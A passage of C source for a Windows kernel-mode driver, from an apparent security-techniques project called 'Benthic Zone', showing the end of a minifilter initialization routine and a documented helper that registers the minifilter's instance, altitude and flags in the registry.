	// Success
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter.c] (Init) - MiniFilter initialization was completed");


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter.c] (Init) - Bye");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return STATUS_SUCCESS;
}



/**
	@brief          Creates required registry keys for the MiniFilter instance.
	@details        This function creates the registry subkeys and values required to register a MiniFilter instance, including "Instances", "DefaultInstance", and its associated altitude and flags.


	@see            PUNICODE_STRING                             https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string
	@param[in]      pRegistryPath                               Path to the MiniFilter registry root key.


	@return          A NTSTATUS value indicating success or an error code if an operation fails.
**/
NTSTATUS
TechniquesMiniFilter_InstanceRegistry(
	_In_            PUNICODE_STRING                             pRegistryPath
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
    HANDLE hKey = NULL, hSubKey = NULL, hInstKey = NULL;
    OBJECT_ATTRIBUTES keyAttr = RTL_CONSTANT_OBJECT_ATTRIBUTES(pRegistryPath, OBJ_KERNEL_HANDLE);
    NTSTATUS status;


	// ---------------------------------------------------------------------------------------------------------------------
    // Open MiniFilter base key

	// The ZwOpenKey routine opens an existing registry key.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwopenkey
    status = ZwOpenKey(&hKey, KEY_WRITE, &keyAttr);

	// Failed
    if (!NT_SUCCESS(status))
    {
		DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter.c] (InstanceRegistry) - Failed to open base registry key (Status 0x%08X).\n", status);
        return status;
    }


	// ---------------------------------------------------------------------------------------------------------------------
    // Create Instances subkey
    UNICODE_STRING subKey = RTL_CONSTANT_STRING(L"Instances");
    OBJECT_ATTRIBUTES subKeyAttr;

	// The InitializeObjectAttributes macro initializes the opaque OBJECT_ATTRIBUTES structure, which specifies the properties of an object handle to routines that open handles.
	// https://learn.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-initializeobjectattributes
    InitializeObjectAttributes(&subKeyAttr, &subKey, OBJ_KERNEL_HANDLE, hKey, NULL);

	// The ZwCreateKey routine creates a new registry key or opens an existing one.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatekey
    status = ZwCreateKey(&hSubKey, KEY_WRITE, &subKeyAttr, 0, NULL, 0, NULL);

	// Failed
    if (!NT_SUCCESS(status))
    {
        DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter.c] (InstanceRegistry) - Failed to create Instances key (Status 0x%08X)\n", status);
		// The ZwClose routine closes an object handle.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwclose
        ZwClose(hKey);
        return status;
    }


	// ---------------------------------------------------------------------------------------------------------------------
    // Set DefaultInstance to MinifilterInstance
    UNICODE_STRING valueName = RTL_CONSTANT_STRING(L"DefaultInstance");
    WCHAR instanceName[] = L"MinifilterInstance";

	// The ZwSetValueKey routine creates or replaces a registry key's value entry.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwsetvaluekey
    status = ZwSetValueKey(hSubKey, &valueName, 0, REG_SZ, instanceName, sizeof(instanceName));

	// Failed
    if (!NT_SUCCESS(status))
    {
        DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter.c] (InstanceRegistry) - Failed to set DefaultInstance (Status 0x%08X)\n", status);
		// The ZwClose routine closes an object handle.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwclose
        ZwClose(hSubKey);
        ZwClose(hKey);
        return status;
    }


	// ---------------------------------------------------------------------------------------------------------------------
    // Create instance key under Instances
    UNICODE_STRING instKeyName;
    RtlInitUnicodeString(&instKeyName, instanceName);
    InitializeObjectAttributes(&subKeyAttr, &instKeyName, OBJ_KERNEL_HANDLE, hSubKey, NULL);

	// The ZwCreateKey routine creates a new registry key or opens an existing one.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatekey
    status = ZwCreateKey(&hInstKey, KEY_WRITE, &subKeyAttr, 0, NULL, 0, NULL);

	// Failed
    if (!NT_SUCCESS(status))
    {
        DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter.c] (InstanceRegistry) - Failed to create instance key (Status 0x%08X)\n", status);
		// The ZwClose routine closes an object handle.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwclose
        ZwClose(hSubKey);
        ZwClose(hKey);
        return status;
    }


	// ---------------------------------------------------------------------------------------------------------------------
    // Set Altitude to 415161
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/allocated-altitudes
    WCHAR altitude[] = L"415161";
    UNICODE_STRING altitudeName = RTL_CONSTANT_STRING(L"Altitude");

	// The ZwSetValueKey routine creates or replaces a registry key's value entry.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwsetvaluekey
    status = ZwSetValueKey(hInstKey, &altitudeName, 0, REG_SZ, altitude, sizeof(altitude));

	// Failed
    if (!NT_SUCCESS(status))
    {
        DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter.c] (InstanceRegistry) - Failed to set Altitude (Status 0x%08X)\n", status);
		// The ZwClose routine closes an object handle.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwclose
        ZwClose(hInstKey);
        ZwClose(hSubKey);
        ZwClose(hKey);
        return status;
    }


	// ---------------------------------------------------------------------------------------------------------------------
    // Set Flags to 0
    UNICODE_STRING flagsName = RTL_CONSTANT_STRING(L"Flags");
    ULONG flags = 0;

	// The ZwSetValueKey routine creates or replaces a registry key's value entry.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwsetvaluekey
    status = ZwSetValueKey(hInstKey, &flagsName, 0, REG_DWORD, &flags, sizeof(flags));

	// Failed
    if (!NT_SUCCESS(status))
    {
        DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter.c] (InstanceRegistry) - Failed to set Flags (Status 0x%08X)\n", status);
		// The ZwClose routine closes an object handle.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwclose
        ZwClose(hInstKey);
        ZwClose(hSubKey);
        ZwClose(hKey);
        return status;
    }


	// ---------------------------------------------------------------------------------------------------------------------
    // Close all opened keys

	// The ZwClose routine closes an object handle.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwclose
    ZwClose(hInstKey);
    ZwClose(hSubKey);
    ZwClose(hKey);


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
    return STATUS_SUCCESS;
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
